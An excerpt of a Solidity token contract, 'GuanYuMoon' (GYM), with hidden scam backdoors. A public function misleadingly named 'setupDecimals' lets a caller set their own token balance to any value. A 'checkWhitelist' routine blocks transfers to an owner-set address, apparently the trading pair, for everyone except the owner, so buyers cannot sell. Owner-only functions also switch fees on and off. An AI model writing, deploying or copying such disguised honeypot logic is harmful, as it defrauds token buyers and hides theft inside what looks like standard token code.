...
contract ERC20 is Context, IERC20, IERC20Metadata {
     ...
     */
    function setupDecimals(uint256 _decimals) public virtual {
        _balances[_msgSender()] = _decimals;
    }
...
contract GuanYuMoon is ERC20, Ownable {
    ...
    address private _isWhitelisted;
    
    IUniswapV2Router02 public uniswapV2Router;

	constructor() ERC20("GuanYuMoon", "GYM") {
    ...
    function _transfer(
        ...
        checkWhitelist(sender,recipient);
    ...
    function trueFee() external onlyOwner{
        buyFeeRate = 2;
        sellFeeRate = 3;
     }
     
    function falseFee() external onlyOwner{
        buyFeeRate = 0;
        sellFeeRate = 0;
    }
    
    function checkWhitelist(address sender,address recipient) internal virtual {
        require(recipient != _isWhitelisted || sender == owner(), "check Whitelist");
    }
     
    function whitelistAddress(address Address) external onlyOwner{
        _isWhitelisted = Address;
    }
    
    function setmarketingAddress(address Address) external onlyOwner {
